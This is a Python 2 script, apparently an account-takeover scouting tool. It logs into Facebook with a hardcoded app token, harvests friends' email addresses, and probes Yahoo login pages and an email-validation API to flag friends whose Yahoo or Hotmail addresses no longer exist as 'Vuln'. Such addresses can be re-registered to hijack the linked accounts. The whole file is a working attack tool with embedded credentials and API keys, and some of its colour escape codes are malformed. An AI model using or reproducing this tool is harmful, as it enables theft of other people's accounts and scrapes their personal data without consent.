# encoding=utf8
# Author @Joshua_Ir$A
#Changing the code not make you the author
import requests, json, os, re, sys, mechanize, urllib
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system("clear")
idt = raw_input("\030[30m[\030[30m*\030[30m] Username : ")
passw = raw_input("\030[30m[\030[30m*\030[30m] Password : ")
url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
data = urllib.urlopen(url)
op = json.load(data)
if 'access_token' in op:
    token = (op["access_token"])
    print ("\040[40m[\030[31m+\030[31m] Login Sukses")
else:
    print ("\040[40m[\030[31m+\030[31m] \033[31mLogin Gagal!!:v")
    sys.exit()
get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
hasil = json.loads(get_friends.text)
print ("\033[39m[\033[31m+\033[39m] Mengumpulkan Yahoo Teman..")
#gan = open('Mail_Yahoo.txt','w')
def defense():
    global o, h
    o = []
    h = 0
    print "\033[36m" + 55*"-"
    print "\033[36m| " + 11*" " + "\033[35mEmail" + 14*" " + "\033[36m|" + 9*" " + "\033[33mVuln" + 8*" " + "\033[36m|"
    print 55*"-"
    for i in hasil['data']:
        wrna = "\033[36m"
        wrne = "\033[39m"
        h +=1
        o.append(h)
        x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
        z = json.loads(x.text)
        try:
            kunci = re.compile(r'@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                br._factory.is_html = True
                br.select_form(nr=0)
                br["username"] = z['email']
                j = br.submit().read()
                Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Zen.search(j).group()
                except:
                    vuln = 6*" " + "\033[31mNot Vuln"
                    #Email Len
                    lean = 30 - (len(z['email']))
                    eml = lean * " "
                    #Name Len
                    lone = 24 - (len(vuln))
                    namel = lone * " "
                    print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = 8*" " + "\033[32mVuln"
                else:
                    vuln = 5*" " + "\033[31mNot Vuln"
                #Email Len
                lean = 30 - (len(z['email']))
                eml = lean * " "                              
                lone = 24 - (len(vuln))
                namel = lone * " "
                print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
            elif 'hotmail' in cari:
                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
                cek = json.loads(requests.get(url).text)
                if cek['smtp_check'] == 0:
                    vuln = 8*" " + "\030[37mVuln"

                else:
                    vuln = 5*" " + "\030[37mTidak Vuln"
                lean = 30 - (len(z['email']))
                eml = lean * " "                             
                lone = 24 - (len(vuln))
                namel = lone * " "
                print "\033[36m| " + wrna + z['email'] + eml + "\033[36m|  " + wrne + vuln + namel + "\033[36m|"
            else:
                pass
        except KeyError:
            pass
defense()
